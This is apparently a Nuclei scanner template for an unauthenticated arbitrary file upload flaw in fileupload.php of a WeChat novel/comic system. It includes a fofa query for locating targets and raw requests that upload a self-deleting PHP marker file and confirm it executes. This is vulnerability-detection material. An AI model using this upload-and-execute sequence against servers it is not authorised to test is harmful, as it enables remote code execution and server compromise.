id: wxxiaoshuo-fileupload_php-File-upload

info:
  tags: wxxiaoshuo-fileupload_php-File-upload
  name: 微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="/Public/home/mhjs/jquery.js"
    微信公众号小说漫画系统 fileupload.php 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305

        --d0b7a0d40eed0e32904c8017b09eb305
        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
        Content-Type: image/jpeg

        <?php print(1111*2222);unlink(__FILE__);?>
        --d0b7a0d40eed0e32904c8017b09eb305--
  - raw:
      - |
        GET /Public/webuploader/0.1.5/server/upload/{{username}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '2468642'
      - type: status
        status: 
          - 200